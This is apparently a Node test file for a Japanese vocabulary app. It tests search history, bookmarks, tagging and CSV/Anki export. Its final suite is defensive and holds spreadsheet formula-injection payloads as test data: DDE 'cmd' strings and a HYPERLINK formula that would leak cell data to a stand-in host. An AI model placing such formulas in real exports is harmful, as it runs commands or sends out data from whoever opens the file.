import test from "node:test";
import assert from "node:assert";
import {
  addSearchHistory,
  removeSearchHistoryItem,
  addVocabularyItem,
  updateVocabularyItem,
  removeVocabularyItem,
  filterVocabulary,
  normalizeTags,
  sanitizeCsvCell,
  exportToCsv,
  exportToAnkiTsv,
  type SearchHistoryItem,
  type VocabularyItem,
} from "../src/services/vocabulary-service.ts";

// =========================================================================
// Suite 1: Search History Service (>3 tests + edge cases)
// =========================================================================

test("Search History: Adds new items and records initial frequency", () => {
  const initial: SearchHistoryItem[] = [];
  const result = addSearchHistory(initial, "日本語");

  assert.strictEqual(result.length, 1);
  assert.strictEqual(result[0].query, "日本語");
  assert.strictEqual(result[0].count, 1);
  assert.ok(result[0].timestamp > 0);
});

test("Search History: Deduplicates repeated queries and increments frequency count", () => {
  let history: SearchHistoryItem[] = [];
  history = addSearchHistory(history, "食べる");
  history = addSearchHistory(history, "飲む");
  // Search "食べる" again
  history = addSearchHistory(history, "食べる");

  assert.strictEqual(history.length, 2, "Should not duplicate entries");
  assert.strictEqual(history[0].query, "食べる", "Re-queried term should move to top");
  assert.strictEqual(history[0].count, 2, "Frequency count must increment to 2");
  assert.strictEqual(history[1].query, "飲む");
});

test("Search History: Enforces maximum capacity limit (FIFO eviction)", () => {
  let history: SearchHistoryItem[] = [];
  const maxLimit = 3;

  history = addSearchHistory(history, "one", maxLimit);
  history = addSearchHistory(history, "two", maxLimit);
  history = addSearchHistory(history, "three", maxLimit);
  history = addSearchHistory(history, "four", maxLimit);

  assert.strictEqual(history.length, 3, "Length must be clamped to maxLimit");
  assert.strictEqual(history[0].query, "four", "Latest item must be at index 0");
  assert.strictEqual(history[2].query, "two", "Oldest non-evicted item remains at tail");
  assert.ok(!history.some((item) => item.query === "one"), "Oldest entry ('one') must be evicted");
});

test("Search History (Edge Cases): Ignores empty strings, whitespace, and handles removal", () => {
  let history: SearchHistoryItem[] = [];
  history = addSearchHistory(history, "");
  history = addSearchHistory(history, "   ");
  history = addSearchHistory(history, "\t\n");
  assert.strictEqual(history.length, 0, "Whitespace/empty entries must be ignored");

  history = addSearchHistory(history, "猫");
  history = addSearchHistory(history, "犬");
  assert.strictEqual(history.length, 2);

  history = removeSearchHistoryItem(history, "猫");
  assert.strictEqual(history.length, 1);
  assert.strictEqual(history[0].query, "犬");
});

// =========================================================================
// Suite 2: Vocabulary Bookmarks & Tagging (>3 tests + edge cases)
// =========================================================================

test("Vocabulary Bookmarks: Adds a bookmark with metadata and tags", () => {
  const list: VocabularyItem[] = [];
  const { list: updated, item } = addVocabularyItem(list, {
    expression: "勉強",
    reading: "べんきょう",
    meanings: ["study", "diligence"],
    tags: ["JLPT N5", "Noun"],
    notes: "Frequently used with する",
    jlpt: "N5",
  });

  assert.strictEqual(updated.length, 1);
  assert.strictEqual(item.expression, "勉強");
  assert.strictEqual(item.reading, "べんきょう");
  assert.deepStrictEqual(item.tags, ["JLPT N5", "Noun"]);
  assert.strictEqual(item.notes, "Frequently used with する");
});

test("Vocabulary Bookmarks: Merges tags and updates details on duplicate entry", () => {
  let list: VocabularyItem[] = [];
  const first = addVocabularyItem(list, {
    expression: "猫",
    reading: "ねこ",
    meanings: ["cat"],
    tags: ["Animal"],
    notes: "Feline",
  });
  list = first.list;

  const second = addVocabularyItem(list, {
    expression: "猫",
    reading: "ねこ",
    meanings: ["cat", "kitty"],
    tags: ["Favorite", "animal"], // Case-insensitive duplicate tag 'animal'
    notes: "Cute feline animal",
  });
  list = second.list;

  assert.strictEqual(list.length, 1, "Must merge into the existing entry, not create a new one");
  assert.deepStrictEqual(list[0].meanings, ["cat", "kitty"]);
  assert.deepStrictEqual(list[0].tags, ["Animal", "Favorite"]);
  assert.strictEqual(list[0].notes, "Cute feline animal");
});

test("Vocabulary Bookmarks: Updates, deletes, and filters entries", () => {
  let list: VocabularyItem[] = [];
  const res1 = addVocabularyItem(list, {
    expression: "犬",
    reading: "いぬ",
    meanings: ["dog"],
    tags: ["Animal"],
    jlpt: "N5",
  });
  const res2 = addVocabularyItem(res1.list, {
    expression: "桜",
    reading: "さくら",
    meanings: ["cherry blossom"],
    tags: ["Nature"],
    jlpt: "N4",
  });
  list = res2.list;

  // Filter by tag
  const animals = filterVocabulary(list, { tag: "animal" });
  assert.strictEqual(animals.length, 1);
  assert.strictEqual(animals[0].expression, "犬");

  // Filter by JLPT
  const n4s = filterVocabulary(list, { jlpt: "N4" });
  assert.strictEqual(n4s.length, 1);
  assert.strictEqual(n4s[0].expression, "桜");

  // Update notes

  // Filter by query (expression, reading, meanings, and notes)
  const queryExpression = filterVocabulary(list, { query: "さくら" });
  assert.strictEqual(queryExpression.length, 1);
  const queryNone = filterVocabulary(list, { query: "nonexistent" });
  assert.strictEqual(queryNone.length, 0);
  list = updateVocabularyItem(list, res1.item.id, { notes: "Man's best friend" });
  const queryNotes = filterVocabulary(list, { query: "best friend" });
  assert.strictEqual(queryNotes.length, 1);
  const updatedItem = list.find((it) => it.id === res1.item.id);
  assert.strictEqual(updatedItem?.notes, "Man's best friend");

  // Remove item
  list = removeVocabularyItem(list, res1.item.id);
  assert.strictEqual(list.length, 1);
  assert.strictEqual(list[0].expression, "桜");
});

test("Vocabulary Bookmarks (Edge Cases): Empty expression rejects, tag normalizer cleans whitespace", () => {
  assert.throws(
    () => addVocabularyItem([], { expression: "   ", reading: "test", meanings: [], tags: [] }),
    /cannot be empty/
  );

  const cleaned = normalizeTags(["  TagA  ", "tagA", "", "   ", "TagB"]);
  assert.deepStrictEqual(cleaned, ["TagA", "TagB"]);
});

// =========================================================================
// Suite 3: CSV & Anki Exporter (>3 tests + edge cases)
// =========================================================================

test("Exporter: Generates RFC 4180 standard CSV", () => {
  const items: VocabularyItem[] = [
    {
      id: "1",
      expression: "猫",
      reading: "ねこ",
      meanings: ["cat"],
      tags: ["Animal", "Pet"],
      notes: "Small pet",
      jlpt: "N5",
      createdAt: 1700000000000,
      updatedAt: 1700000000000,
    },
  ];

  const csv = exportToCsv(items);
  const lines = csv.split("\r\n");

  assert.strictEqual(lines[0], "expression,reading,meanings,tags,notes,jlpt,createdAt");
  assert.ok(lines[1].includes("猫,ねこ"));
  assert.ok(lines[1].includes("Animal; Pet"));
});

test("Exporter: Generates valid Anki TSV format", () => {
  const items: VocabularyItem[] = [
    {
      id: "1",
      expression: "食べる",
      reading: "たべる",
      meanings: ["to eat"],
      tags: ["JLPT_N5", "Verb"],
      notes: "Ichidan verb",
      createdAt: 1700000000000,
      updatedAt: 1700000000000,
    },
  ];

  const tsv = exportToAnkiTsv(items);
  const lines = tsv.split("\n");

  assert.strictEqual(lines[0], "#expression\treading\tmeanings\ttags\tnotes");
  const dataCols = lines[1].split("\t");
  assert.strictEqual(dataCols[0], "食べる");
  assert.strictEqual(dataCols[1], "たべる");
  assert.strictEqual(dataCols[2], "to eat");
  assert.strictEqual(dataCols[3], "JLPT_N5 Verb");
  assert.strictEqual(dataCols[4], "Ichidan verb");
});

test("Exporter (Edge Cases): Handles quotes, commas, and newlines in text fields", () => {
  const items: VocabularyItem[] = [
    {
      id: "1",
      expression: 'Special "Quote"',
      reading: "quote, reading",
      meanings: ["meaning with, comma and\nnewline"],
      tags: ["Tag"],
      createdAt: 1700000000000,
      updatedAt: 1700000000000,
    },
  ];

  const csv = exportToCsv(items);
  assert.ok(csv.includes('"""Quote"""') || csv.includes('""Quote""'), "Double quotes must be escaped per RFC 4180");
  assert.ok(csv.includes('"quote, reading"'), "Fields with commas must be wrapped in quotes");
});

// =========================================================================
// Suite 4: DevSecOps Mitigation - STRIDE Formula Injection (>3 tests + edge cases)
// =========================================================================

test("DevSecOps STRIDE: Neutralizes formula prefixes (=, +, -, @)", () => {
  const payloads = [
    "=1+1",
    "+cmd|' /C calc'!A0",
    "-2+3*10",
    "@SUM(1,2)",
  ];

  for (const payload of payloads) {
    const sanitized = sanitizeCsvCell(payload);
    assert.ok(
      sanitized.startsWith("'") || sanitized.startsWith("\"'"),
      `Payload '${payload}' must be prepended with single quote to prevent formula execution, got '${sanitized}'`
    );
  }
});

test("DevSecOps STRIDE: Strips leading carriage returns/tabs used to evade formula detection", () => {
  const sneakyPayload = "\t=cmd|' /C calc'!A0";
  const sanitized = sanitizeCsvCell(sneakyPayload);
  assert.ok(
    sanitized.includes("'="),
    "Leading tab must be stripped and formula prefix neutralized"
  );
});

test("DevSecOps STRIDE: Preserves benign text without corrupting normal entries", () => {
  assert.strictEqual(sanitizeCsvCell("日本語"), "日本語");
  assert.strictEqual(sanitizeCsvCell("Simple Note 123"), "Simple Note 123");
  assert.strictEqual(sanitizeCsvCell(""), "");
  assert.strictEqual(sanitizeCsvCell(null), "");
  assert.strictEqual(sanitizeCsvCell(undefined), "");
});

test("DevSecOps STRIDE: Full CSV export neutralizes injected malicious expressions in notes", () => {
  const maliciousItems: VocabularyItem[] = [
    {
      id: "evil-1",
      expression: "危険",
      reading: "きけん",
      meanings: ["danger"],
      tags: ["Sec"],
      notes: "=HYPERLINK(\"http://malicious-site.example/leak?data=\"&A1,\"Click Here\")",
      createdAt: 1700000000000,
      updatedAt: 1700000000000,
    },
  ];

  const exportedCsv = exportToCsv(maliciousItems);
  assert.ok(
    !exportedCsv.includes(',=HYPERLINK'),
    "Malicious formula must not appear unescaped in CSV output"
  );
  assert.ok(
    exportedCsv.includes("''=HYPERLINK") || exportedCsv.includes("'=HYPERLINK"),
    "Formula must be neutralized with prepended quote"
  );
});
